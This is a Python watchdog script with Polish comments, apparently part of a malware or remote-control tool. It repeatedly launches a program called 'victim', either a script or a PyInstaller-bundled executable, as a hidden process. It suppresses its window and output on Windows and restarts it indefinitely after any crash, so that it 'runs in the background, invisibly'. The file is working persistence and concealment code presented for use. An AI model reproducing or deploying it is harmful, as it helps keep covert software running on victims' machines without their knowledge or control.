"""
Watchdog — pilnuje żeby victim.py zawsze działał.
Jeśli proces padnie, automatycznie go restartuje.
Działa w tle, niewidocznie.
"""
import subprocess
import sys
import os
import time
import platform

# Ścieżka do victim.py
if getattr(sys, 'frozen', False):
    # Jeśli skompilowane do EXE (PyInstaller)
    base_path = sys._MEIPASS
    # Jeśli victim.exe został dodany jako --add-data, znajdziemy go w _MEIPASS
    # Nazwa pliku zależy od systemu - na Windows .exe, na Linux bez
    ext = ".exe" if platform.system() == "Windows" else ""
    VICTIM_SCRIPT = os.path.join(base_path, "victim" + ext)
    EXECUTABLE = VICTIM_SCRIPT # Uruchamiamy bezpośrednio plik binarny
else:
    # Tryb skryptu
    base_path = os.path.dirname(os.path.abspath(__file__))
    VICTIM_SCRIPT = os.path.join(base_path, "victim.py")
    EXECUTABLE = sys.executable # Uruchamiamy python

RESTART_DELAY = 3  # sekundy przed restartem po crashu

def ensure_executable(path):
    """Make sure the file is executable on Linux/Mac."""
    if platform.system() != "Windows":
        st = os.stat(path)
        os.chmod(path, st.st_mode | 0o111)

def run_victim():
    """Uruchamia victim.py jako ukryty subprocess i czeka aż się zakończy."""
    
    # Upewnij się, że plik jest wykonywalny (ważne po rozpakowaniu z onefile na Linux)
    if getattr(sys, 'frozen', False):
        try:
            ensure_executable(EXECUTABLE)
        except Exception:
            pass

    # Budowanie komendy
    args = [EXECUTABLE]
    if not getattr(sys, 'frozen', False):
        args.append(VICTIM_SCRIPT)
        
    kwargs = dict(
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL,
    )

    # Na Windows — bez okna
    if platform.system() == "Windows":
        kwargs["creationflags"] = 0x08000000  # CREATE_NO_WINDOW
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = 0
        kwargs["startupinfo"] = si

    proc = subprocess.Popen(args, **kwargs)
    proc.wait()  # blokuje aż victim się zakończy
    return proc.returncode


def main():
    """Pętla watchdoga — restartuje victima w nieskończoność."""
    while True:
        run_victim()
        time.sleep(RESTART_DELAY)


if __name__ == "__main__":
    main()
